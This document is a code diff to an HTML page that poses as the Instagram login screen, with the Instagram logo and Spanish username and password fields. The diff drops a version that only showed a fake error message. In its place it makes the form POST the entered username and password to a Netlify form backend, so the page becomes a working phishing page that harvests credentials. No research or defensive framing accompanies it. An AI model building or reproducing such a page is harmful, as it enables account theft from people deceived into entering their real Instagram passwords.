@@ -160,6 +160,10 @@
         border: none;
         padding: 30px 20px;
       }
+
+    button[disabled] {
+      background-color: #b2dffc !important;
+      cursor: not-allowed !important;
     }
   </style>
 </head>
@@ -174,20 +178,21 @@
   </div>
 
   <!-- Contenido principal -->
-  <div class="container" id="mainContainer">
+  <div class="container" id="mainContainer" style="display:none;">
     <div class="logo">
       <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram">
     </div>
 
-  <form name="login" netlify>
-    <input type="hidden" name="form-name" value="login" />
-    <p class="hidden">
-      <label>Don’t fill this out if you're human: <input name="bot-field" /></label>
-    </p>
-    <input type="text" name="username" placeholder="Teléfono, usuario o correo electrónico" required />
-    <input type="password" name="password" placeholder="Contraseña" required />
-    <button type="submit">Iniciar sesión</button>
-  </form>
+    <form name="login" method="POST" netlify netlify-honeypot="bot-field" action="/thank-you.html">
+      <input type="hidden" name="form-name" value="login" />
+      <p class="hidden">
+        <label>Don’t fill this out if you're human: <input name="bot-field" /></label>
+      </p>
+
+      <input type="text" name="username" placeholder="Teléfono, usuario o correo electrónico" required />
+      <input type="password" name="password" placeholder="Contraseña" required />
+      <button type="submit" disabled>Iniciar sesión</button>
+    </form>
 
     <div class="divider">
       <hr>
@@ -199,7 +204,7 @@
     <div class="forgot">¿Olvidaste tu contraseña?</div>
   </div>
 
-  <div class="signup" id="signupContent">
+  <div class="signup" id="signupContent" style="display:none;">
     ¿No tienes una cuenta? <a href="#">Regístrate</a>
   </div>
 
@@ -214,95 +219,21 @@
       mainContent.style.display = 'block';
       signupContent.style.display = 'block';
     });
-  </script>
 
-  <!-- Notificación de error -->
-<div class="error-overlay" id="errorOverlay">
-  <div class="error-modal">
-    <span class="close-error" id="closeError">✖</span><br>
-    <p>Algo ocurrió mal, no se pudo iniciar sesión</p>
-  </div>
-</div>
+    const usernameInput = document.querySelector('input[name="username"]');
+    const passwordInput = document.querySelector('input[name="password"]');
+    const loginButton = document.querySelector('button[type="submit"]');
 
-<style>
-  .error-overlay {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background-color: rgba(0,0,0,0.6);
-    display: none;
-    justify-content: center;
-    align-items: center;
-    z-index: 9999;
-  }
-
-  .error-modal {
-    background-color: white;
-    padding: 20px 25px;
-    border-radius: 10px;
-    position: relative;
-    max-width: 300px;
-    text-align: center;
-    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
-  }
-
-  .error-modal p {
-    margin: 0;
-    font-size: 15px;
-    color: #333;
-  }
-
-  .close-error {
-    position: absolute;
-    top: 8px;
-    right: 10px;
-    font-size: 18px;
-    color: #666;
-    cursor: pointer;
-  }
-
-  button[disabled] {
-    background-color: #b2dffc !important;
-    cursor: not-allowed !important;
-  }
-</style>
-
-<script>
-  const usernameInput = document.querySelector('input[type="text"]');
-  const passwordInput = document.querySelector('input[type="password"]');
-  // const loginButton = document.querySelector('button[type="submit"]');
-  const errorOverlay = document.getElementById('errorOverlay');
-  const closeError = document.getElementById('closeError');
-
-  // Función para verificar campos
-  function checkInputs() {
-    if (usernameInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
-      loginButton.disabled = false;
-    } else {
-      loginButton.disabled = true;
+    function checkInputs() {
+      loginButton.disabled = !(usernameInput.value.trim() && passwordInput.value.trim());
     }
-  }
 
-  // Escuchamos los inputs
-  usernameInput.addEventListener('input', checkInputs);
-  passwordInput.addEventListener('input', checkInputs);
+    usernameInput.addEventListener('input', checkInputs);
+    passwordInput.addEventListener('input', checkInputs);
 
-  // Mostrar error al enviar
-  document.querySelector('form').addEventListener('submit', function(e) {
-    e.preventDefault();
-    errorOverlay.style.display = 'flex';
-  });
-
-  // Cerrar notificación
-  closeError.addEventListener('click', () => {
-    errorOverlay.style.display = 'none';
-  });
-
-  // Estado inicial
-  loginButton.disabled = true;
-</script>
+    // Inicialmente el botón deshabilitado
+    loginButton.disabled = true;
+  </script>
 
 </body>
 </html>
